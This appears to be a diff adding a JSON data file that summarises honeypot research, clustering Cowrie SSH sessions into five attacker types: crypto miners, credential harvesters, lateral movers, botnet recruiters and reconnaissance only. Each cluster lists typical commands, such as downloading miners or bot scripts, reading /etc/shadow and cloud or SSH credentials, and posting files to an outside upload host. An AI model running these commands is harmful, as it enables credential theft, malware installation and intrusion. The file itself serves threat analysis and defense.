@@ -1,0 +1,62 @@
+{
+  "clusters": [
+    {
+      "id": "crypto_miner",
+      "name": "Crypto Miners",
+      "color": "#B85C2F",
+      "icon": "⛏",
+      "description": "Immediately downloads and executes cryptocurrency mining software. Targets GPU-equipped servers. Checks for nvidia-smi, downloads XMRig or custom miners, sets up persistence via crontab.",
+      "typicalCommands": ["wget http://*/xmrig", "nvidia-smi", "nohup ./miner", "crontab -e", "chmod +x miner"],
+      "percentage": 34,
+      "avgSessionDuration": 847,
+      "exampleIps": ["185.220.101.34", "45.148.10.92", "103.145.13.41"]
+    },
+    {
+      "id": "credential_harvester",
+      "name": "Credential Harvesters",
+      "color": "#7B4F9D",
+      "icon": "🔑",
+      "description": "Systematically extracts credentials and secrets from the filesystem. Targets .aws/credentials, .ssh keys, .env files, /etc/shadow. Often exfiltrates via curl or scp to external servers.",
+      "typicalCommands": ["cat /etc/shadow", "cat ~/.aws/credentials", "cat ~/.ssh/*.pem", "cat .env", "curl -X POST http://*/upload -d @"],
+      "percentage": 28,
+      "avgSessionDuration": 423,
+      "exampleIps": ["61.0.46.98", "109.175.18.22", "222.252.39.138"]
+    },
+    {
+      "id": "lateral_mover",
+      "name": "Lateral Movers",
+      "color": "#4A7AB5",
+      "icon": "🕸",
+      "description": "Scans the internal network for additional targets. Checks ARP tables, runs ping sweeps, attempts SSH to other hosts using harvested credentials. Indicates sophisticated multi-stage attacks.",
+      "typicalCommands": ["cat /proc/net/arp", "ping -c 1 192.168.*", "ssh root@10.*", "nmap -sn 172.16.0.0/24", "ifconfig"],
+      "percentage": 12,
+      "avgSessionDuration": 1256,
+      "exampleIps": ["173.25.186.130", "186.235.193.170"]
+    },
+    {
+      "id": "botnet_recruiter",
+      "name": "Botnet Recruiters",
+      "color": "#D64045",
+      "icon": "🤖",
+      "description": "Downloads and installs botnet malware (Mirai variants, IRC bots). Disables security services, modifies iptables to block competing bots, establishes C2 callback. Fully automated with no human interaction.",
+      "typicalCommands": ["cd /tmp", "wget http://*/bot.sh", "chmod 777 bot.sh", "service iptables stop", "./bot.sh"],
+      "percentage": 18,
+      "avgSessionDuration": 34,
+      "exampleIps": ["49.124.154.175", "218.79.216.217", "2.197.114.21"]
+    },
+    {
+      "id": "recon_only",
+      "name": "Reconnaissance Only",
+      "color": "#6B8F23",
+      "icon": "👁",
+      "description": "Logs in, runs basic system enumeration (uname, whoami, id, df), and disconnects without taking action. Likely automated scanners cataloging vulnerable hosts for later exploitation or sale.",
+      "typicalCommands": ["uname -a", "whoami", "id", "df -h", "cat /proc/cpuinfo", "exit"],
+      "percentage": 8,
+      "avgSessionDuration": 12,
+      "exampleIps": ["118.145.66.151", "103.99.0.42"]
+    }
+  ],
+  "method": "TF-IDF on Cowrie command sequences, k-means (k=5), silhouette score 0.72",
+  "totalSessions": 282860,
+  "sessionsWithCommands": 41429
+}
